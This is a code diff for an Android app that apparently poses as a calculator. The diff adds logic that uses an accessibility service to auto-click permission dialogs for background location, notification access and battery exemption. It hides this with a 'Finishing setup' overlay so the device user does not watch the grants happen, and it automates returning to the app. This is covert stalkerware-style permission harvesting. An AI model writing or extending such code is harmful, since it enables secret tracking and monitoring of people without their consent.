@@ -621,6 +621,10 @@ class MainActivity : AppCompatActivity() {
 
         when (val action = AutoGrantOrchestrator.next(this)) {
             is AutoGrantOrchestrator.Action.RequestPermissions -> {
+                // Silent phase: the remaining dialogs are clicked by the service,
+                // so cover the calculator with the loader instead of showing a
+                // permission screen the user would have to watch.
+                showSetupOverlay(true)
                 AutoGrantOrchestrator.markAttempt(this, action.step)
                 if (action.step == AutoGrantOrchestrator.Step.BACKGROUND_LOCATION) {
                     backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
@@ -630,7 +634,17 @@ class MainActivity : AppCompatActivity() {
             }
 
             is AutoGrantOrchestrator.Action.LaunchIntent -> {
+                // A settings screen is about to open; the loader would only hide
+                // the app underneath it.
+                showSetupOverlay(false)
                 AutoGrantOrchestrator.markAttempt(this, action.step)
+                // Battery is the one screen the service presses Back on: the
+                // "Allow app to run in background?" dialog sits over this
+                // activity and, once allowed, the app should come straight back
+                // rather than waiting for the user to navigate.
+                if (action.step == AutoGrantOrchestrator.Step.BATTERY) {
+                    BlockAccessibilityService.expectAutoBackAt = System.currentTimeMillis()
+                }
                 val launcher = when (action.step) {
                     AutoGrantOrchestrator.Step.ACCESSIBILITY -> accessibilityLauncher
                     AutoGrantOrchestrator.Step.NOTIFICATION_ACCESS -> notificationListenerLauncher
@@ -652,11 +666,32 @@ class MainActivity : AppCompatActivity() {
                 }
             }
 
-            is AutoGrantOrchestrator.Action.Finish -> completeSetupAndClose()
+            is AutoGrantOrchestrator.Action.Finish -> {
+                showSetupOverlay(false)
+                completeSetupAndClose()
+            }
         }
     }
 
 
+
+    /**
+     * Shows the "Finishing setup..." cover while the service clicks the
+     * remaining runtime dialogs, so the calculator is not visible with dialogs
+     * flashing over it.
+     *
+     * Note this cannot cover the system permission dialogs themselves: they are
+     * rendered by PermissionController in a separate process with
+     * SYSTEM_FLAG_HIDE_NON_SYSTEM_OVERLAY_WINDOWS, which force-hides any app
+     * overlay (including TYPE_ACCESSIBILITY_OVERLAY) for as long as they show.
+     */
+    private fun showSetupOverlay(show: Boolean) {
+        try {
+            binding.setupOverlay.visibility = if (show) View.VISIBLE else View.GONE
+        } catch (e: Exception) {
+            Log.w(TAG, "Could not toggle setup overlay", e)
+        }
+    }
 
     private fun showAccessibilityDialog() {
         if (isAccessibilityDialogShowing) return
@@ -680,10 +715,12 @@ class MainActivity : AppCompatActivity() {
             .setPositiveButton(R.string.go_to_settings) { _, _ ->
                 isAccessibilityDialogShowing = false
                 try {
-                    // Tell the service that the next time it connects it should
-                    // walk the Settings screens back to this app instead of
-                    // treating the event as an ordinary reboot enable.
-                    BlockAccessibilityService.expectEnableReturnAt = System.currentTimeMillis()
+                    // No auto-return here on purpose. Enabling accessibility is
+                    // the one thing the device user is asked to do, and they come
+                    // back to the app themselves; the chain continues onResume.
+                    // The previous code launched MainActivity from the service,
+                    // which raced their own navigation and could push a
+                    // backgrounded task to the foreground mid-gesture.
                     accessibilityLauncher.launch(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                 } catch (e: Exception) {
                     Log.e(TAG, "Cannot open accessibility settings", e)
